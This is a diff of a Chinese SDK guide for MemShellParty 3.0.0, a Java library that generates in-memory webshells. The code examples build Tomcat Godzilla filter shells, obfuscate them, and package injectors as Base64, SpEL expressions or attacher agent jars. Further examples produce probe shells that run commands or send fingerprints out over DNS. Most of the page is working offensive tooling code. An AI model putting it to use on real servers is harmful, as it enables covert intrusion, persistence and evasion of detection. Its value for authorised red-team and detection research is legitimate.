@@ -1,16 +1,29 @@
 ---
 title: SDK 集成
 icon: BrainCircuit
-description: 适合集成到已有工具中，实现内存马 payload 的生成，支持 JDK8 以上版本，v1.7.0 开始支持
+description: 3.0.0 接入指南：按需组合生成引擎、server 与 shell 工具模块，调用生成、查询、打包与探测 API
 ---
 
 import { Tab, Tabs } from "fumadocs-ui/components/tabs";
 
-> 具体代码可参考 [examples](https://github.com/ReaJason/MemShellParty/tree/master/memshell-party-examples)
+> 3.0.0 起 Maven 坐标从 `io.github.reajason:generator` 迁移为
+> `io.github.reajason:memshell-party-*`，模块与 API 不兼容旧版。
+> 可运行示例见 [memshell-party-examples](https://github.com/ReaJason/MemShellParty/tree/master/memshell-party-examples)。
 
-### 添加依赖
+### 模块选择
 
-1. 生成引擎：`memshell-party-core`（传递引入 `memshell-party-api` 与 `memshell-party-common`）
+| 模块 | 内容 |
+| --- | --- |
+| `memshell-party-core` | `MemShellGenerator`、`ProbeShellGenerator`、注册表、混淆；传递 `api`、`common` 与 ByteBuddy |
+| `memshell-party-api` | 配置、结果、SPI 与 packer 契约；只需契约类型时单独引入（packer 插件只依赖它） |
+| `memshell-party-server-<name>` | 目标容器的注入器；聚合模块 `memshell-party-server-all` |
+| `memshell-party-shelltool-<name>` | 工具协议、配置与模板；聚合模块 `memshell-party-shelltool-all` |
+| `memshell-party-packer` | 内置打包方式，可选 |
+| `memshell-party-stub-<name>` | 生成期签名桩，由对应 server 模块按需传递 |
+| `memshell-party-gui-sdk` | Swing 生成器界面与 `GuiExtension`，可选 |
+
+生成内存马的最小依赖是 `core` + 目标 `server` + 目标 `shelltool`。server 与 shelltool 通过
+`ServiceLoader` 自动注册，生成器按名字查表。
 
 <Tabs items={["Maven", "Gradle"]}>
   <Tab>
@@ -18,183 +31,242 @@ import { Tab, Tabs } from "fumadocs-ui/components/tabs";
     <dependency>
       <groupId>io.github.reajason</groupId>
       <artifactId>memshell-party-core</artifactId>
-      <version>2.11.0</version>
+      <version>3.0.0</version>
     </dependency>
-    ```
-  </Tab>
-  <Tab>
-      ```groovy
-      implementation 'io.github.reajason:memshell-party-core:2.11.0'
-      ```
-  </Tab>
-</Tabs>
-
-2. 按需添加要生成的 server 和 shell 工具模块，各自通过 SPI 自动注册；也可以用聚合模块一次性引入全部
-
-<Tabs items={["Maven", "Gradle"]}>
-  <Tab>
-    ```xml
-    <!-- 只生成 Tomcat + Godzilla -->
     <dependency>
       <groupId>io.github.reajason</groupId>
       <artifactId>memshell-party-server-tomcat</artifactId>
-      <version>2.11.0</version>
+      <version>3.0.0</version>
     </dependency>
     <dependency>
       <groupId>io.github.reajason</groupId>
       <artifactId>memshell-party-shelltool-godzilla</artifactId>
-      <version>2.11.0</version>
+      <version>3.0.0</version>
     </dependency>
 
-    <!-- 或者：全部 server / 全部 shell 工具 -->
-    <dependency>
-      <groupId>io.github.reajason</groupId>
-      <artifactId>memshell-party-server-all</artifactId>
-      <version>2.11.0</version>
-    </dependency>
-    <dependency>
-      <groupId>io.github.reajason</groupId>
-      <artifactId>memshell-party-shelltool-all</artifactId>
-      <version>2.11.0</version>
-    </dependency>
-    ```
-  </Tab>
-  <Tab>
-  ```groovy
-  implementation 'io.github.reajason:memshell-party-server-tomcat:2.11.0'
-  implementation 'io.github.reajason:memshell-party-shelltool-godzilla:2.11.0'
-  ```
-  </Tab>
-</Tabs>
-
-3. 如果需要使用自带的丰富打包方式，需要额外添加 `memshell-party-packer` 模块
-
-<Tabs items={["Maven", "Gradle"]}>
-  <Tab>
-    ```xml
+    <!-- 可选：内置打包方式 -->
     <dependency>
       <groupId>io.github.reajason</groupId>
       <artifactId>memshell-party-packer</artifactId>
-      <version>2.11.0</version>
+      <version>3.0.0</version>
     </dependency>
     ```
   </Tab>
   <Tab>
-  ```groovy
-  implementation 'io.github.reajason:memshell-party-packer:2.11.0'
-  ```
+    ```groovy
+    implementation 'io.github.reajason:memshell-party-core:3.0.0'
+    implementation 'io.github.reajason:memshell-party-server-tomcat:3.0.0'
+    implementation 'io.github.reajason:memshell-party-shelltool-godzilla:3.0.0'
+
+    // 可选
+    implementation 'io.github.reajason:memshell-party-packer:3.0.0'
+    ```
   </Tab>
 </Tabs>
 
-> 不引入 packer 时没有“默认打包器”：生成结果直接使用 `result.getInjectorBytesBase64Str()`
-> （探测马为 `getShellBytesBase64Str()`）。REST/MCP 的 `packer` 传空字符串、桌面端不装配打包选择条，
-> 输出即 raw Base64。
->
-> packer 通过 `ServiceLoader` 发现，第三方实现只需 `implements Packer`、标
-> `@PackerMeta(name = "...", parent = "分组名", requiresClasses = {...})`，并在 jar 内提供
-> `META-INF/services/com.reajason.javaweb.packer.Packer`。`parent` 只是展示目录的分组名，
-> 不要求存在同名 packer；分组只支持一级。可选依赖（如 JNA、Jackson、Hessian）
-> 可以在下游 exclude：缺失时对应注册项自动跳过，其余 packer 与整个注册表不受影响。
-> 内置名称可直接引用 `Packers` 中的字符串常量（类似 `ShellType`）。
+运行期为 Java 8+；生成的类默认是 class 版本 50（Java 6），用 `ShellConfig.targetJreVersion` 调整。
 
-4. 生成期 API 依赖：内存马模板的父类/接口需要能以**字节形式**解析（只解析签名，不会加载进 JVM），
-   需要用到的 API 请自行添加，例如生成 Tomcat 的 `Filter`/`Valve` 时：
-
-```xml
-<dependency>
-  <groupId>javax.servlet</groupId>
-  <artifactId>javax.servlet-api</artifactId>
-  <version>3.0.1</version>
-</dependency>
-<dependency>
-  <groupId>org.apache.tomcat.embed</groupId>
-  <artifactId>tomcat-embed-core</artifactId>
-  <version>8.5.85</version>
-</dependency>
-```
-
-> 这类 API 特意不作为 server/shelltool 模块的传递依赖，避免不相关的 server（spring、dubbo、reactor 等）
-> 被一起引入。目标机器上没有真实 Jetty 时，可用 `memshell-party-stub-jetty` 提供 `Handler`/`Customizer` 等签名。
-
-### 生成 Tomcat Godzilla Filter 内存马示例
+### 生成内存马
 
 ```java
-import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
-import com.reajason.javaweb.packer.ClassPackerConfig;
-import com.reajason.javaweb.packer.Packers;
+GodzillaConfig godzillaConfig = GodzillaConfig.builder()
+        .pass("pass")
+        .key("key")
+        .headerName("User-Agent")
+        .headerValue("Mozilla/5.0")
+        .build();
 
+MemShellResult result = new MemShellGenerator().generate(
+        ShellConfig.builder()
+                .server(Server.Tomcat)
+                .shellTool(ShellTool.Godzilla)
+                .shellType(ShellType.FILTER)
+                .shrink(true)
+                .debug(false)
+                .build(),
+        InjectorConfig.builder()
+                .urlPattern("/*")
+                .build(),
+        godzillaConfig);
+
+System.out.println(result.getShellBytesBase64Str());
+```
+
+没传的字段由生成器补齐：`serverVersion=unknown`、`targetJreVersion=Java 6`、`urlPattern=/*`、
+随机的 shell / 注入器类名；实际使用的配置写回 `result`。
+
+| 结果 | 内容 |
+| --- | --- |
+| `getShellClassName()` / `getShellBytesBase64Str()` | 内存马类名与字节 |
+| `getInjectorClassName()` / `getInjectorBytesBase64Str()` | 注入器类名与字节 |
+| `getHelperClassName()` / `getHelperBytesBase64Str()` | 辅助类（RawWebSocket、Dubbo 等），没有时为 null |
+| `getShellToolConfig()` | 实际工具配置，含随机默认值 |
+| `getObfuscationInfo()` | 混淆前后体积；未开启混淆时为 null |
+
+强类型 config 来自对应的 shelltool 模块。Agent 内存马同样走 `ShellConfig`：`shellType` 选
+`AGENT_FILTER_CHAIN`、`CATALINA_AGENT_CONTEXT_VALVE` 等，生成后用 `AgentJar` 系 packer 落盘为 jar。
+
+### 混淆
+
+```java
 ShellConfig shellConfig = ShellConfig.builder()
         .server(Server.Tomcat)
         .shellTool(ShellTool.Godzilla)
         .shellType(ShellType.FILTER)
-        .shrink(true) // 缩小字节码
-        .debug(false) // 关闭调试
+        .obfuscation(ObfuscationConfig.enabled())
+        .obfuscationScope(ObfuscationScope.ALL)
         .build();
-
-InjectorConfig injectorConfig = InjectorConfig.builder()
-//                .urlPattern("/*")  // 自定义 urlPattern，默认就是 /*
-//                .shellClassName("com.example.memshell.GodzillaShell") // 自定义内存马类名，默认为空时随机生成
-//                .injectorClassName("com.example.memshell.GodzillaInjector") // 自定义注入器类名，默认为空时随机生成
-        .build();
-
-GodzillaConfig godzillaConfig = GodzillaConfig.builder()
-//                .pass("pass")
-//                .key("key")
-//                .headerName("User-Agent")
-//                .headerValue("test")
-        .build();
-
-MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
-
-System.out.println("注入器类名："+result.getInjectorClassName());
-System.out.println("内存马类名："+result.getShellClassName());
-
-System.out.println(result.getShellConfig());
-System.out.println(result.getShellToolConfig());
-
-// 未引入 packer 模块时：注入器字节的 Base64 直接可用
-System.out.println("Base64 输出："+result.getInjectorBytesBase64Str());
-
-// 引入 memshell-party-packer 后，PackerRegistry 通过 SPI 发现内置/第三方 packer
-System.out.println("Base64 打包："+PackerRegistry.getInstance().pack(Packers.DefaultBase64, result));
-System.out.println("脚本引擎打包："+PackerRegistry.getInstance().pack(Packers.ScriptEngine, result));
 ```
 
-### 生成 Tomcat Godzilla AgentFilterChain 示例
+`ObfuscationScope` 可选 `ALL`、`MEMSHELL_INJECTOR`、`INJECTOR`、`MEMSHELL`；单个选项用
+`ObfuscationConfig.enabled(options)` 覆盖。可填选项见 `GET /api/config/obfuscation/options`。
+
+### 动态参数
+
+GUI、REST、MCP 共用一条绑定路径：参数名就是工具 config 上 `@ConfigField` 的字段名，另加生成期参数
+`shellClassName`。不依赖具体 shelltool 模块时用这个入口。
 
 ```java
-ShellConfig shellConfig = ShellConfig.builder()
-        .server(Server.Tomcat)
-        .shellTool(ShellTool.Godzilla)
-        .shellType(ShellType.AGENT_FILTER_CHAIN)
-        .shrink(true) // 缩小字节码
-        .debug(false) // 关闭调试
-        .build();
+Map<String, String> params = new LinkedHashMap<>();
+params.put("pass", "pass");
+params.put("key", "key");
+params.put("shellClassName", "com.example.memshell.DemoGodzilla");
 
-InjectorConfig injectorConfig = InjectorConfig.builder()
-//                .urlPattern("/*")  // 自定义 urlPattern，默认就是 /*
-//                .shellClassName("com.example.memshell.GodzillaShell") // 自定义内存马类名，默认为空时随机生成
-//                .injectorClassName("com.example.memshell.GodzillaInjector") // 自定义注入器类名，默认为空时随机生成
-        .build();
-
-GodzillaConfig godzillaConfig = GodzillaConfig.builder()
-//                .pass("pass")
-//                .key("key")
-//                .headerName("User-Agent")
-//                .headerValue("test")
-        .build();
-
-MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
-
-System.out.println("注入器类名：" + result.getInjectorClassName());
-System.out.println("内存马类名：" + result.getShellClassName());
-
-System.out.println(result.getShellConfig());
-System.out.println(result.getShellToolConfig());
-
-byte[] agentJarBytes = ((JarPacker) PackerRegistry.getInstance().get(Packers.AgentJar))
-        .packBytes(JarPackerConfig.from(result));
-Files.write(Paths.get("agent.jar"), agentJarBytes);
+MemShellResult result = new MemShellGenerator().generate(shellConfig, injectorConfig, params);
 ```
 
-**封装统一生成接口可参考 [MemShellGeneratorController.java](https://github.com/ReaJason/MemShellParty/blob/master/memshell-party-boot/src/main/java/com/reajason/javaweb/boot/controller/MemShellGeneratorController.java)**
+留空的参数跳过，保持 builder 默认值；写错参数名抛 `GenerationException` 并列出可用参数。参数目录：
+
+```java
+for (ToolConfigFactory.ToolConfigDescriptor descriptor : ToolConfigFactory.describeAll()) {
+    System.out.println(descriptor.getTool() + " -> " + descriptor.getParams());
+}
+```
+
+### 查询支持矩阵
+
+```java
+MemShellGenerator.ShellTypeCatalog catalog = new MemShellGenerator().getShellTypeCatalog();
+
+catalog.asMap();                                            // server -> tool -> shellType
+catalog.getServers();
+catalog.getServersSupporting(ShellTool.Godzilla);
+catalog.getShellTools(Server.Tomcat);
+catalog.getShellTypes(Server.Tomcat, ShellTool.Godzilla);
+```
+
+矩阵是 server 注入器映射与工具 shellType 映射的交集，没有注入器的组合不会出现；不存在的组合返回空列表
+而不是 null。REST `GET /api/config`、GUI 下拉框与 MCP `memshell_capabilities` 都读这份快照。
+
+### 打包与投递
+
+```java
+PackerRegistry packers = PackerRegistry.getInstance();
+packers.getNames();
+String payload = packers.pack(Packers.DefaultBase64, result);
+String raw = packers.pack(PackerRegistry.RAW, result);   // 注入器原始 Base64
+```
+
+- 不引入 `memshell-party-packer` 时目录为空，`pack("")` 与 REST/MCP 不传 `packer` 都输出原始 Base64。
+- `JarPacker`（`AgentJar`、`AgentJarWithJREAttacher`、`AgentJarWithJDKAttacher`）统一由 `pack` 返回
+  Base64，落盘时自行解码：
+
+```java
+byte[] agentJar = Base64.getDecoder().decode(
+        PackerRegistry.getInstance().pack(Packers.AgentJar, result));
+Files.write(Paths.get("agent.jar"), agentJar);
+```
+
+- 探测马用 `packers.pack(name, probeResult)`；`JarPacker` 不支持探测马。
+- SpEL 表达式系 packer 有类名与长度约束，生成前先过 `PackerConstraints`：
+
+```java
+PackerConstraints constraints = PackerConstraints.forPacker(packerName);
+constraints.constrainObfuscation(shellConfig.getObfuscation());
+injectorConfig.setInjectorClassName(
+        constraints.enforceClassName(injectorConfig.getInjectorClassName()));
+
+MemShellResult result = new MemShellGenerator().generate(shellConfig, injectorConfig, config);
+String payload = packers.pack(constraints.getPackerName(), result);
+```
+
+REST/MCP 的完整编排见
+[GenerationService.java](https://github.com/ReaJason/MemShellParty/blob/master/memshell-party-boot/src/main/java/com/reajason/javaweb/boot/service/GenerationService.java)。
+
+### 生成探测马
+
+探测马只依赖 `memshell-party-core`，不依赖 server 模块；容器模板在 core 内按
+`ResponseConfig.server(...)` 查表。
+
+```java
+ProbeConfig probeConfig = ProbeConfig.builder()
+        .probeMethod(ProbeMethod.ResponseBody)
+        .probeContent(ProbeContent.Command)
+        .shrink(true)
+        .build();
+
+ResponseConfig responseConfig = ResponseConfig.builder()
+        .server(Server.Tomcat)
+        .reqParamName("payload")
+        .build();
+
+ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, responseConfig);
+System.out.println(result.getShellClassName());
+```
+
+| 探测方式 | 内容配置 | 用途 |
+| --- | --- | --- |
+| `DNSLog` | `DnsLogConfig.host` | 出网与指纹外带 |
+| `ResponseBody` | `ResponseConfig` | 结果写入响应体 |
+| `ResponseHeader` | `ResponseConfig.respHeaderName` | 结果写入响应头 |
+| `Sleep` | `SleepConfig.seconds` | 无回显时延验证 |
+
+### 桌面端界面
+
+`memshell-party-gui-sdk` 提供 `MemShellGeneratorFrame`、`ProbeGeneratorFrame`、`DecompileFrame`
+与 `GuiExtension`；server 与内置工具不随 SDK 走。
+
+```groovy
+implementation 'io.github.reajason:memshell-party-gui-sdk:3.0.0'
+implementation 'io.github.reajason:memshell-party-server-tomcat:3.0.0'
+```
+
+```java
+MemShellGui.createMemShellFrame().setVisible(true);
+```
+
+内嵌布局、状态栏与快捷键的接线见
+[gui-sdk README](https://github.com/ReaJason/MemShellParty/blob/master/memshell-party-gui/memshell-party-gui-sdk/README.md)，
+完整外壳见
+[custom-gui 示例](https://github.com/ReaJason/MemShellParty/tree/master/memshell-party-examples/memshell-party-example-custom-gui)。
+
+### 生成期 API 依赖
+
+生成器只读取模板类与父类的字节解析签名，不会把它们加载进 JVM。server 模块已把对应签名桩作为
+`implementation` 带入：
+
+| server 模块 | 签名桩 |
+| --- | --- |
+| `memshell-party-server-tomcat` | `memshell-party-stub-tomcat` |
+| `memshell-party-server-jetty` | `memshell-party-stub-jetty` |
+| `memshell-party-server-dubbo` | `memshell-party-stub-dubbo` |
+
+消费方同时引入真实容器（例如测试里的 `tomcat-embed-core`）时，要排除同包名的桩，否则真身会被桩遮蔽：
+
+```groovy
+testImplementation('io.github.reajason:memshell-party-server-tomcat:3.0.0') {
+    exclude group: 'io.github.reajason', module: 'memshell-party-stub-tomcat'
+}
+```
+
+自定义模板所需的 API 自行 `compileOnly` 引入（如 `javax.servlet-api`）。这些 API 特意不作为
+server/shelltool 的传递依赖，避免把一个容器的 API 带进另一个场景。
+
+### 3.0.0 迁移要点
+
+- 坐标：`io.github.reajason:generator` → `memshell-party-*`；`generator` 拆成 `api` 与 `core`。
+- server 与 shelltool 拆成独立模块；聚合用 `memshell-party-server-all` / `memshell-party-shelltool-all`。
+- Packer 与 SPI 契约移入 `api`；内置打包方式改为 `ServiceLoader` 可选插件，缺失的可选依赖自动跳过。
+- Suo5 v1 移除，原 Suo5v2 更名为 `Suo5`。
+- 新增外置插件：实现 `ServerProvider` / `ShellToolProvider` / `Packer` 的 jar 放入 `plugins/`，
+  REST、MCP 与桌面端共用；写法见 [插件扩展](/docs/plugin)。
